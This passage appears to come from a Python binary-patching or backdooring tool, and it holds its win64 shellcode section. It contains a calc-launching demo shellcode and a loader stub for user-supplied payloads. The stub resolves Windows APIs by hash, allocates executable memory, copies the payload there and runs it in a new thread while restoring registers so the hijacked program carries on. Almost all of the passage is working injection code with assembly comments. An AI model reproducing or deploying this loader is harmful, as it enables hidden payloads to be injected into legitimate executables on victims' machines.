                            b"\x49\x89\xD8"                  # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            b"\x48\x89\xC1"                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES (NULL)
                            b"\x49\xC7\xC2\x38\x68\x0D\x16"  # mov r10, 0x160D6838 ; hash("kernel32.dll","CreateThread")
                            b"\xFF\xD5"                      # call rbp            ; Spawn payload thread
                            b"\x48\x83\xC4\x58"              # add rsp, 50
                            # stackrestore
                            b"\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            b"\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        self.shellcode1 += b"\xE9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        return self.stackpreserve + self.shellcode1 + self.shellcode2

    def demo_calc(self):
        """
        win64 start calc shellcode
        """
        return  (b"\x50\x51\x52\x53\x56\x57\x55\x6A\x60\x5A\x68\x63\x61\x6C\x63\x54\x59\x48\x83\xEC"
                b"\x28\x65\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48\x8B\x30\x48\x8B"
                b"\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24"
                b"\x0F\xB7\x2C\x17\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B\x74\x1F"
                b"\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF\xD7\x48\x83\xC4\x30\x5D\x5F\x5E"
                b"\x5B\x5A\x59\x58")
    
    def demo_nop(self):
        """
        just nop!
        """
        return b"\x90"
    
    def user_supplied_shellcode(self):
        """
        win64 raw/binary shellcode
        """

        return self.supplied_shellcode

    def user_supplied_shellcode_threaded(self):
        """
        User supplies the shellcode, make sure that it EXITs via a thread.
        """

        # overloading the class stackpreserve
        self.stackpreserve = (b"\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              b"\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.shellcode2 = b"\xE8\xB8\xFF\xFF\xFF"
        self.shellcode2 += self.supplied_shellcode

        self.shellcode1 = (b"\x90"                              # <--THAT'S A NOP. \o/
                           b"\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           # api_call
                           b"\x41\x51"                          # push r9
                           b"\x41\x50"                          # push r8
                           b"\x52"                              # push rdx
                           b"\x51"                              # push rcx
                           b"\x56"                              # push rsi
                           b"\x48\x31\xD2"                      # xor rdx,rdx
                           b"\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           b"\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           b"\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           # next_mod
                           b"\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           b"\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           b"\x4d\x31\xc9"                      # xor r9,r9
                           # loop_modname
                           b"\x48\x31\xc0"                      # xor rax,rax
                           b"\xac"                              # lods
                           b"\x3c\x61"                          # cmp al, 61h (a)
                           b"\x7c\x02"                          # jl 02
                           b"\x2c\x20"                          # sub al, 0x20
                           # not_lowercase
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           b"\x41\x01\xc1"                      # add r9d, eax
                           b"\xe2\xed"                          # loop until read, back to xor rax, rax
                           b"\x52"                              # push rdx ;Save the current position in the module list
                           b"\x41\x51"                          # push r9 ; Save the current module hash for later
                                                                # ; Proceed to itterate the export address table,
                           b"\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           b"\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           b"\x48\x85\xc0"                      # test rax, rax ; Test if no export address table
                           b"\x74\x67"                          # je get_next_mod1 ; If no EAT present, process the nex
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x50"                              # push rax ; Save the current modules EAT
                           b"\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function
                           b"\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address

                           # get_next_func: ;
                           b"\xe3\x56"                          # jrcxz get_next_mod; When we reach the start of the EAT
                           b"\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           b"\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           b"\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           b"\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash
                                                                #  ; And compare it to the one we wan
                           # loop_funcname: ;
                           b"\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           b"\xac"                              # lodsb ; Read in the next byte of the ASCII funct name
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           b"\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           b"\x38\xe0"                          # cmp al, ah ; Compare AL to AH (null)
                           b"\x75\xf1"                          # jne loop_funcname ; continue
                           b"\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add the current module hash
                           b"\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash
                           b"\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash

                           b"\x58"                              # pop rax ; Restore the current modules EAT
                           b"\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           b"\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; Get the funct addr table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx]; Get the desired func RVA
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address

                           # finish:
                           b"\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           b"\x41\x58"                          # pop r8 ;Clear off the curr position in the module list
                           b"\x5E"                              # pop rsi ; Restore RSI
                           b"\x59"                              # pop rcx ; Restore the 1st parameter
                           b"\x5A"                              # pop rdx ; Restore the 2nd parameter
                           b"\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           b"\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           b"\x41\x5A"                          # pop r10 ; pop off the return address
                           b"\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the register params

                           b"\x41\x52"                          # push r10 ; push back the return address
                           b"\xFF\xE0"                          # jmp rax ; Jump into the required function

                           # get_next_mod: ;
                           b"\x58"                              # pop rax ; Pop off the current modules EAT
                           # get_next_mod1: ;
                           b"\x41\x59"                          # pop r9 ; Pop off the current modules hash
                           b"\x5A"                              # pop rdx ; Restore our position in the module list
                           b"\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           b"\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           )
        # allocate
        self.shellcode1 += (b"\x5d"                              # pop rbp
                            b"\x49\xc7\xc6"                      # mov r14, 1abh size of payload...
                            )
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += (b"\x6a\x40"                          # push 40h
                            b"\x41\x59"                          # pop r9 now 40h
                            b"\x68\x00\x10\x00\x00"              # push 1000h
                            b"\x41\x58"                          # pop r8.. now 1000h
                            b"\x4C\x89\xF2"                      # mov rdx, r14
                            b"\x6A\x00"                          # push 0
                            b"\x59"                              # pop rcx
                            b"\x68\x58\xa4\x53\xe5"              # push E553a458
                            b"\x41\x5A"                          # pop r10
                            b"\xff\xd5"                          # call rbp
                            b"\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            b"\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            )

        self.shellcode1 += b"\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        self.shellcode1 += b"\xeb\x43"

        # got_payload:
        self.shellcode1 += (b"\x5e"                                  # pop rsi            ; Prepare ESI with the source
                            b"\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX memo
                            b"\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            # set_handler:
                            b"\x48\x31\xC0"                  # xor rax,rax
                            b"\x50"                          # push rax            ; LPDWORD lpThreadId (NULL)
                            b"\x50"                          # push rax            ; DWORD dwCreationFlags (0)
                            b"\x49\x89\xC1"                  # mov r9, rax         ; LPVOID lpParameter (NULL)
                            b"\x48\x89\xC2"                  # mov rdx, rax        ; LPTHREAD_START_ROUTINE  (payload)
                            b"\x49\x89\xD8"                  # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            b"\x48\x89\xC1"                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES (NULL)
                            b"\x49\xC7\xC2\x38\x68\x0D\x16"  # mov r10, 0x160D6838 ; hash("kernel32.dll","CreateThread")
                            b"\xFF\xD5"                      # call rbp            ; Spawn payload thread
                            b"\x48\x83\xC4\x58"              # add rsp, 50

                            # stackrestore
                            b"\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            b"\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        self.shellcode1 += b"\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        return self.stackpreserve + self.shellcode1 + self.shellcode2

##########################################################
#                END win64 shellcodes                    #
##########################################################